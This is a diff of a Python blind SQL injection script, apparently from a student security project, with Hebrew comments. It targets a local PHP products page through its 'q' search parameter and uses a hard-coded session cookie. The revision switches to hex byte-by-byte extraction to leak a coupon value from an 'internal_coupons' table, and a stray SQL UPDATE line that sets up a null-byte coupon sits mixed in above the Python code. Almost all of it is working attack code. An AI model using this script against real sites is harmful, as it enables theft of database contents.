@@ -1,50 +1,73 @@
+-- עדכון הקופון כך שיתחיל בבייט אפס (Null Byte)
+UPDATE internal_coupons 
+SET encrypted_code = X'00' || 'SECRET50' 
+WHERE id = 1;
+
 import requests
-import string
 
-# --- נתונים שהוצאנו מהסקריפט שעובד ---
+# --- נתונים מהאתר ---
 BASE_URL = "http://localhost/CyberProject/products.php"
-COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'} 
+COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'}
 
-#Charset הכולל אותיות ומספרים
-CHARSET = string.ascii_uppercase + string.digits
+# תווים הקסדצימליים לבדיקת בייטים (00 עד FF)
+HEX_CHARS = "0123456789ABCDEF"
 
 def check_condition(payload):
-    # אנחנו משתמשים בפרמטר q ובשיטת GET כי שם ה-UNION עבד
+    # שימוש בפרמטר q שבו מצאנו את הפרצה
     params = {'q': f"%' AND ({payload}) --"}
-    response = requests.get(BASE_URL, params=params, cookies=COOKIES)
-    
-    # ב-Blind SQLi, אנחנו מחפשים סימן שהתנאי הצליח.
-    # אם התנאי אמת, האתר יציג מוצרים. אם שקר, האתר יהיה ריק (כי הוספנו AND).
-    # נבדוק אם מופיעה המילה 'product-card' שקיימת ב-HTML שלך
-    return "product-card" in response.text
+    try:
+        response = requests.get(BASE_URL, params=params, cookies=COOKIES)
+        # אם התנאי אמת, המוצרים (product-card) יופיעו בדף
+        return "product-card" in response.text
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
 
 def leak_coupon():
-    coupon = ""
-    print("[*] Starting Blind SQLi to leak coupons from 'internal_coupons'...")
+    hex_result = ""
+    decoded_string = ""
+    print("[*] Starting Blind SQLi - Binary Extraction Mode...")
+    print("[*] Target Table: internal_coupons | Column: encrypted_code")
     
+    pos = 1
     while True:
-        found_char = False
-        for char in CHARSET:
-            # בניית השאילתה:
-            # אנחנו מניחים שיש טבלה בשם internal_coupons ועמודה בשם encrypted_code
-            # אנחנו משתמשים ב-CAST כדי להפוך את ה-BLOB לטקסט (ב-SQLite)
-            current_pos = len(coupon) + 1
-            
-            # השאילתה בודקת: האם התו במיקום X שווה ל-Char?
-            sub_query = f"SELECT SUBSTR(CAST(encrypted_code AS TEXT),{current_pos},1) FROM internal_coupons LIMIT 1"
-            payload = f"({sub_query})='{char}'"
-            
-            if check_condition(payload):
-                coupon += char
-                print(f"[+] Found character: {coupon}")
-                found_char = True
-                break
+        found_byte = False
+        # ניחוש בייט אחד (מיוצג ע"י 2 תווי HEX)
+        for c1 in HEX_CHARS:
+            for c2 in HEX_CHARS:
+                guess_hex = c1 + c2
+                
+                # השאילתה בודקת את הערך ההקסדצימלי של הבייט במיקום pos
+                sub_query = f"SELECT HEX(SUBSTR(encrypted_code,{pos},1)) FROM internal_coupons LIMIT 1"
+                payload = f"({sub_query})='{guess_hex}'"
+                
+                if check_condition(payload):
+                    hex_result += guess_hex
+                    
+                    # ניסיון פענוח התו לצורך תצוגה בלבד
+                    try:
+                        char = bytes.fromhex(guess_hex).decode('ascii')
+                        if char.isprintable():
+                            decoded_string += char
+                        else:
+                            decoded_string += f"\\x{guess_hex}" # הצגת תווים לא קריאים כמו 00
+                    except:
+                        decoded_string += f"\\x{guess_hex}"
+                        
+                    print(f"[+] Pos {pos}: Found HEX {guess_hex} | Current: {decoded_string}")
+                    found_byte = True
+                    break
+            if found_byte: break
         
-        if not found_char:
+        if not found_byte:
+            # אם לא מצאנו אף בייט בטווח, כנראה הגענו לסוף המידע
             break
+        pos += 1
             
-    return coupon
+    return decoded_string
 
-# הרצה
-final_result = leak_coupon()
-print(f"\n[!] Final Coupon Leaked: {final_result}")
+# הרצת החילוץ
+final_coupon = leak_coupon()
+print("-" * 40)
+print(f"[!] Extraction Complete!")
+print(f"[!] Final Value: {final_coupon}")
